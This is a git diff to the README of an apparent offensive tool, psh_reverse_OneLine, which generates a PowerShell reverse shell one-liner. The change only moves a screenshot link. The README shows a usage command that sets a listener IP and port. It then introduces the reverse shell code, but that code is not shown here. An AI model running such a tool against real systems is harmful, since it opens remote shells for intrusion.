@@ -12,9 +12,8 @@ syntax:
 Example:
 
 	python3 psh_reverse_OneLine.py -i 192.168.1.2 -p 4444
-	![Screenshot_20231011_232617](https://github.com/toto22222/psh_reverse_OneLine/assets/104328855/3c439b84-6da4-4947-bd4e-095009622eee)
 
-
+![Screenshot_20231011_232617](https://github.com/toto22222/psh_reverse_OneLine/assets/104328855/3c439b84-6da4-4947-bd4e-095009622eee)
 
 FYI, the powershell reverse shell one liner code as below:
 
